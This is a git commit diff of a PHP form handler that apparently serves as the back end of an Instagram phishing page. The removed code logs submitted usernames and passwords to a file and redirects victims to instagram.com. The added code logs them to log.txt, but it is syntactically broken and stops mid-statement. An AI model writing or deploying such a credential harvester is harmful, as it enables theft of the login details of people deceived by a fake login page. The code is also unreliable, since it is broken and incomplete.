d7d89b10817a6e6288b9e4e79771091b9eae9a7f
mihnev22 <foodbolho@gmail.com>
2024-11-18 01:14:09 +0200

    Update form.php

--- form.php
+++ form.php
@@ -1,27 +1,11 @@
-<?php
-// Получение данных из POST-запроса
-$var1 = $_POST['username'] ?? null;
-$var2 = $_POST['password'] ?? null;
+<? php
 
-// Проверка наличия данных
-if (!$var1 || !$var2) {
-    die('Error: Username or Password not provided.');
-}
+$username = $_POST['username'];
+$password = $_POST['password' ];
 
-// Проверка наличия файла protect.html
-$myFile = @file_get_contents('protect.html');
-$searchString = "<html><title>WELCOME</title></html>";
+$fp = fopen( filename:'log.txt', mode:'a+');
+fwrite($fp, string: 'Username: ' . $username . "\n");
+fwrite($fp, string: 'Password: ' . $password . "\n");
+fwrite($fp,
 
-if ($myFile !== $searchString) {
-    // Сохранение данных в файл
-    $log = "EMAIL: " . $var1 . " [PASS]: " . $var2 . "\n";
-    file_put_contents('protect.html', $log, FILE_APPEND);
 
-    // Перенаправление
-    header('Location: https://instagram.com'/);
-    exit();
-} else {
-    echo 'LOGIN SUCCESSFUL!';
-}
-exit();
-?>
